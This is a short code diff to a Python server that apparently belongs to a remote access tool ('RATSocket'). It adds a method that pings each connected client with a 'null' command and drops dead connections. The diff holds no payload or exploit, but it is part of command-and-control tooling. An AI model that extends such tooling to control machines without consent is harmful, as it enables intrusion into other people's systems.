@@ -1,3 +1,5 @@
+import socket
+
 from entity.client import Client
 from entity.ratsocket import RATSocket
 
@@ -21,3 +23,12 @@ class Server:
     def handler(self, conn, addr):
         print('[+] Connection has been established: {}'.format(addr))
         self.connections.append(Client(conn, addr))
+
+    # 移除无效连接
+    def test_connections(self):
+        for i, conn in reversed(list(enumerate(self.connections))):
+            try:
+                conn.send_command('null', 'null')
+                conn.recv_result()
+            except socket.error:
+                del self.connections[i]
